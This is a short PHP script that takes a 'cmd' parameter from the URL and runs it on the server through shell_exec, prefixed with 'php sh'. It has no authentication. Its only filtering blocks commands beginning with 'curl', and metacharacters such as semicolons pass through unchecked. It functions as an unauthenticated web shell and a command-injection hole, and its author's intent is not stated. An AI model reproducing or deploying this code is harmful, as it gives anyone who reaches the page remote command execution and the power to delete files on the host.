<?php
if(isset($_GET['cmd']) && $_GET['cmd']!=''){
	 $cmd = strtolower($_GET['cmd']);
	 $explode = explode("/",$cmd);
	 if(count($explode) > 0){ echo $base_cmd = $explode[0];
		if($base_cmd == 'curl'){
			die("Sorry, Remote curl not allowed.");
		}
		if($base_cmd == 'rm' || $base_cmd == 'remove'){
			$cmd = $cmd." y";
		}
	}
	$cmd = str_replace("/"," ",$cmd);
	echo shell_exec("php sh ".$cmd);
	die;
}
echo "yes";
?>
